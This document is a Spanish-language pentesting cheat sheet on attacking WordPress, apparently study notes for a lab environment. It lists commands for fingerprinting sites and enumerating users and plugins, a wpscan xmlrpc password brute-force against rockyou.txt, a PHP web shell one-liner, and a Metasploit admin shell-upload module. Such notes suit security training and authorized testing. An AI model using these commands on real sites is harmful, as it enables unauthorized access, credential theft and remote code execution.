	#### Attacking Wordpress
Es un CMS altamente customizable. Esto genera que ante un mal uso o malas configuraciones pueda tener vulnerabilidades.

	### Discovery / Footprint
/robots.txt
#Para identificar un sitio wordpress podemos visitar el robots.txt. En este se podrian encontrar algunos allow o disallow que nos den pistas de que es una pagina wordpress
curl -s http://<dominio> | grep WordPress
#Con esto podemos buscar informacion y asi saber si es wp o no dependiendo el output que nos devuelva puesto que es muy probable que nos devuelva la versio de wp.
curl -s http://<dominio> | grep themes
#Permite buscar los themas que se estan usando en l apagina wp
curl -s http://<dominio> | grep plugins
#De esta forma, podemos buscar los plugins. Ver seccion de mas abajo al respecto

	### User enumeration
El login (wp-login.php) por default tiene mensajes distintos tanto para un usuario o contraseña incorrecta.

searchsploit wordpress user enumeration
#Nos muestra un script en php para enumerar usuarios
curl -s -X GET <url>/wp-json/wp/v2/users
#Ruta que consulta el script. De esta forma podemos ver si responde con un json
wpscan --url http://blog.inlanefreight.local/ --enumerate
#Al igual que con los plugins, permite enumerar usuarios

	### Plugins
Si bien el wordpress que se usa puede no tener vulnerabilidades conocidas, existe la posibilidad que se este usando un plugin que si tiene vulnerabilidades.

/wp-content/plugins
#En esta ubicacion suelen estar los plugins que se usan. Estos podrian verse sin bruteforcear si el directory listing esta habilitado
/wp-content/plugins/<plugin name>
#Visitar el plugin para poder ver informacin de este en caso de ser posible
#En el caso donde no muestre nada se debe intentar acceder al /reedme.txt para tener informacion del plugin como por ej su version
Discovery/Web-Content/CMS/wp-plugins.fuzz.txt
#Path para diccionario de plugins wp

	### WPScan
sudo gem install wpscan
#Es un tool de enumeracion automatico que determina si varios themas y plugins usados son vulnerables.

	## Flags
--url
#Se especifica la url de la pagina wp
--enumerate
#Se usa esta flag para enumerar varios componentes de wordpress como plugins, temas, usuarios, backups y media. Todo esto de forma default.
--api-token
#Con el token de nuestra cuenta free en la pagina tenemos hasta 75 request diarias para realizar analisis de vulnerabilidades en la pagina usando contenido externo como reportes.
-t
#Ajusta los hilos. Default 5


	### Archivos importantes
wp-config.php
#Es un archivo en word press que suele tener credenciales de base de datos y contraseñas.


	## Brute forcing
sudo wpscan --password-attack xmlrpc -t 20 -U <usuario> -P /usr/share/wordlists/rockyou.txt --url http://<url>
#Bruteforce con wpscan

	## Code execution
system($_GET[0]);
#Con acceso administrativo podemos modificar el codigo PHP para ejecutar comandos
use exploit/unix/webapp/wp_admin_shell_upload 
#Modulo de Metasploit que permite subir una web shell y ejecutarla automaticamente mediante un usuario y contraseña de admin

